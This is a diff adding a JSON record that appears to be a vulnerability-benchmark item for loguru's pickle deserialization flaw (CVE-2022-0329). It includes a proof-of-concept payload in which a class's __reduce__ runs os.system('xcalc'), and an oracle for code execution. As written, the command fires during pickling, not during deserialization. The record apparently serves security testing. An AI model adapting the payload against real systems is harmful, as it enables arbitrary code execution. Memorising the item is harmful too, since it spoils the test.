@@ -1,0 +1,15 @@
+{
+  "file_id": "890_loguru_issue_563",
+  "numeric_id": "890",
+  "library_hint": "loguru",
+  "source": "github_issue",
+  "title": "Arbitrary code execution via pickle deserialization in _from_pickled_value function",
+  "cve": "CVE-2022-0329",
+  "cwe": "CWE-502: Deserialization of Untrusted Data",
+  "library": "loguru",
+  "affected_version": ">= 0.3.0",
+  "vulnerable_function": "_from_pickled_value",
+  "triggerability": "indirect",
+  "trigger_payload": "import os\n\nclass Malicious:\n    def __reduce__(self):\n        os.system(\"xcalc\")\n        return (Malicious, ())\n\nlogger.info(Malicious())",
+  "oracle": "arbitrary code execution (e.g. calculator launched)"
+}
